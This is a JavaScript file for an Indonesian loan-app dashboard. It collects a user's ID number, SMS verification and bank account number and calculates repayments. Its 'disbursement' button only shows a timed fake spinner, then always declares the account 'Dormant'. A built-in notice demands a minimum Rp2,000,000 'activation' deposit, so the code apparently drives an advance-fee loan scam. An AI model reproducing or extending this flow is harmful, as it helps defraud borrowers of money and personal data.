(() => {
  'use strict';

  if (!NovaStorage.requireSession('index.html')) return;
  if (!NovaStorage.requireIdentity('form-nik.html')) return;
  if (!NovaStorage.requireSmsVerification('verifikasi-sms.html')) return;
  if (!NovaStorage.requireResult('hasil-pengajuan.html')) return;

  const identity = NovaStorage.getIdentity();
  const application = NovaStorage.getApplication();

  const $ = id => document.getElementById(id);
  const setText = (id, value) => {
    const node = $(id);
    if (node) node.textContent = value;
  };

  const rupiah = value => new Intl.NumberFormat('id-ID', {
    style:'currency',
    currency:'IDR',
    maximumFractionDigits:0
  }).format(value);

  const animateNumber = (element, target, formatter, duration = 900) => {
    if (!element) return;
    const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
    if (reduceMotion) {
      element.textContent = formatter(target);
      return;
    }

    const start = performance.now();
    const from = 0;

    const step = now => {
      const progress = Math.min((now - start) / duration, 1);
      const eased = 1 - Math.pow(1 - progress, 3);
      element.textContent = formatter(Math.round(from + (target - from) * eased));
      if (progress < 1) requestAnimationFrame(step);
    };

    requestAnimationFrame(step);
  };

  const initials = NovaStorage.initials(identity.fullName);
  const maskedNik = NovaStorage.maskNik(identity.nik);

  const bankAccount = $('bankAccount');
  const accountCard = $('accountCard');
  const disbursementButton = $('disbursementButton');
  const accountMessage = $('accountMessage');
  const useLimitButton = $('useLimitButton');

  ['welcomeName','profileName','identityName'].forEach(id => setText(id, identity.fullName));
  ['profileNik','identityNik'].forEach(id => setText(id, maskedNik));
  ['profileAvatar','identityAvatar'].forEach(id => setText(id, initials));
  if (bankAccount) bankAccount.value = application.bankAccount || '';
  setText('progressValue', `${application.progress || 0}%`);

  animateNumber($('limitValue'), application.limit, rupiah, 1000);

const BANK_LENGTH = 11;

const setBankMessage = (text, status = 'default') => {
  if (!accountMessage) return;
  accountMessage.textContent = text;
  accountMessage.classList.toggle('account-message--error', status === 'error');
  accountMessage.classList.toggle('account-message--success', status === 'success');
};

const updateBankState = value => {
  const digits = String(value || '').replace(/\D/g, '');
  const valid = digits.length === BANK_LENGTH;

  if (bankAccount) bankAccount.value = digits;
  if (disbursementButton) disbursementButton.disabled = !valid;

  if (valid) {
    setBankMessage('Nomor rekening valid. Rekening tersimpan otomatis.', 'success');
    NovaStorage.setApplication({ bankAccount: digits });
  } else {
    setBankMessage(
      digits.length === 0
        ? 'Masukkan nomor rekening bank terlebih dahulu.'
        : `Masukkan tepat ${BANK_LENGTH} digit nomor rekening. Saat ini ${digits.length}.`,
      'error'
    );
    NovaStorage.setApplication({ bankAccount: '' });
  }

  return valid;
};

if (bankAccount) {
  const initialValue = application.bankAccount || '';
  bankAccount.value = initialValue;
  updateBankState(initialValue);

  bankAccount.addEventListener('input', function () {
    this.value = this.value.replace(/\D/g, '');

    if (this.value.length > BANK_LENGTH) {
      this.value = this.value.substring(0, BANK_LENGTH);
    }

    updateBankState(this.value);
  });
}

if (useLimitButton) {
  useLimitButton.addEventListener('click', () => {
    const valid = bankAccount && bankAccount.value.length === BANK_LENGTH;
    const target = accountCard || bankAccount;
    if (target) {
      target.scrollIntoView({ behavior:'smooth', block:'center' });
    }

    if (!valid) {
      setBankMessage('🔒 Wajib memasukkan nomor rekening bank dulu untuk menggunakan limit.', 'error');
      bankAccount?.focus();
      return;
    }

    setBankMessage('Rekening tersimpan. Silakan klik Cairkan Pinjaman untuk menggunakan limit.', 'success');
    if (disbursementButton) disbursementButton.disabled = false;
  });
}

const disbursementModal = $('disbursementModal');
const modalTitle = $('modalTitle');
const modalMessage = $('modalMessage');
const closeDisbursementModal = $('closeDisbursementModal');
const modalLoadingIcon = $('modalLoadingIcon');
const notificationImage = $('notificationImage');

const showDisbursementLoading = () => {
  if (modalLoadingIcon) modalLoadingIcon.classList.remove('hidden');
  if (notificationImage) notificationImage.classList.add('hidden');
  if (modalTitle) modalTitle.textContent = 'Sedang memproses pencairan';
  if (modalMessage) modalMessage.textContent = 'Mohon tunggu, sistem sedang memproses pencairan rekening Anda.';
};

const showDisbursementNotification = () => {
  if (modalLoadingIcon) modalLoadingIcon.classList.add('hidden');
  if (notificationImage) notificationImage.classList.remove('hidden');
  if (modalTitle) modalTitle.textContent = 'PERHATIAN';
  if (modalMessage) modalMessage.textContent = 'Status Rekening: Dormant. Silakan lanjutkan aktivasi untuk meneruskan proses layanan pengajuan.';
};

if (disbursementButton) {
  disbursementButton.addEventListener('click', () => {
    if (disbursementButton.disabled) return;
    if (!bankAccount || bankAccount.value.length !== BANK_LENGTH) {
      setBankMessage('🔒 Masukkan 11 digit nomor rekening bank terlebih dahulu.', 'error');
      bankAccount?.focus();
      return;
    }

    if (disbursementModal) {
      disbursementModal.classList.remove('hidden');
      disbursementModal.setAttribute('aria-hidden', 'false');
    }

    showDisbursementLoading();
    setBankMessage('Proses pencairan dimulai. Mohon tunggu...', 'success');
    disbursementButton.disabled = true;

    window.setTimeout(() => {
      showDisbursementNotification();
      if (disbursementButton) disbursementButton.disabled = false;
    }, 1600);
  });
}

if (closeDisbursementModal) {
  closeDisbursementModal.addEventListener('click', () => {
    if (disbursementModal) {
      disbursementModal.classList.add('hidden');
      disbursementModal.setAttribute('aria-hidden', 'true');
    }
    if (notificationImage) notificationImage.classList.add('hidden');
    if (modalLoadingIcon) modalLoadingIcon.classList.remove('hidden');
  });
}

  const progressCircle = $('progressCircle');
  if (progressCircle) {
    const radius = Number(progressCircle.getAttribute('r')) || 62;
    const circumference = 2 * Math.PI * radius;
    progressCircle.style.strokeDasharray = `${circumference}`;
    progressCircle.style.strokeDashoffset = `${circumference}`;
    requestAnimationFrame(() => {
      progressCircle.style.strokeDashoffset =
        `${circumference - (application.progress / 100) * circumference}`;
    });
  }

  const amount = $('amount');
  const tenor = $('tenor');
  const rate = $('rate');
  const rateText = $('rateText');
  const monthly = $('monthly');
  const monthlySummary = $('monthlySummary');
const dormantNotice = `
<div class="modal-overlay" id="rekeningModal">

  <div class="modal-card premium">

    <div class="modal-icon">
      ⚠️
    </div>

    <h3>Perhatian Keamanan Rekening</h3>

    <div class="status-badge">
      Status Rekening: Dormant
    </div>

    <p class="modal-desc">
      Sistem mendeteksi bahwa rekening Anda belum memiliki aktivitas
      transaksi dalam periode tertentu.
    </p>

    <p class="modal-desc">
      Untuk melanjutkan proses layanan pembiayaan,
      diperlukan <strong>verifikasi rekening</strong> dan
      aktivasi layanan sesuai ketentuan yang berlaku.
    </p>


    <div class="activation-box">

      <h4>Ketentuan Aktivasi</h4>

      <div class="activation-item">
        <span>Saldo awal aktivasi</span>
        <strong>Minimal Rp2.000.000</strong>
      </div>

    </div>


    <div class="security-info">

      <span>🔒</span>

      <p>
        Dana yang tersedia tetap menjadi milik Anda dan dapat digunakan
        sesuai ketentuan layanan rekening.
      </p>

    </div>


    <p class="footer-message">
      Silakan lanjutkan aktivasi untuk meneruskan proses layanan pengajuan.
    </p>


    <div class="modal-actions">

      <button class="btn-secondary" id="closeRekeningModal">
        Kembali
      </button>

      <button class="btn-primary" id="activateRekening">
        Lanjutkan Aktivasi
      </button>

    </div>


  </div>

</div>
`;
  if (amount) amount.value = application.limit;
  if (tenor) tenor.value = String(application.tenor);
  if (rate) rate.value = String(application.annualRate);

  function calculate() {
    const principal = Math.max(Number(amount?.value) || 0, 0);
    const months = Math.max(Number(tenor?.value) || 1, 1);
    const annual = Math.max(Number(rate?.value) || 0, 0);
    const monthlyRate = annual / 100 / 12;
    const payment = monthlyRate === 0
      ? principal / months
      : principal * monthlyRate * Math.pow(1 + monthlyRate, months)
        / (Math.pow(1 + monthlyRate, months) - 1);

    if (rateText) rateText.textContent = `${annual}%`;
    if (monthly) monthly.textContent = rupiah(payment || 0);
    if (monthlySummary) monthlySummary.textContent = rupiah(payment || 0);
  }

  amount?.addEventListener('input', calculate);
  tenor?.addEventListener('change', calculate);
  rate?.addEventListener('input', calculate);
  calculate();

  const go = target => {
    if (!target) return;
    const node = document.querySelector(target);
    node?.scrollIntoView({ behavior:'smooth', block:'start' });
  };

  document.querySelectorAll('[data-scroll]').forEach(button => {
    button.addEventListener('click', () => go(button.getAttribute('data-scroll')));
  });

  $('editIdentity')?.addEventListener('click', () => {
    window.location.href = 'form-nik.html';
  });

  $('logoutButton')?.addEventListener('click', () => {
    NovaStorage.clearSession();
    window.location.replace('index.html');
  });

  $('newApplicationButton')?.addEventListener('click', () => go('#simulasi'));
  $('fabButton')?.addEventListener('click', () => go('#simulasi'));

  const overlay = $('skeletonOverlay');
  window.addEventListener('load', () => {
    window.setTimeout(() => overlay?.classList.add('hidden'), 260);
  }, { once:true });
})();
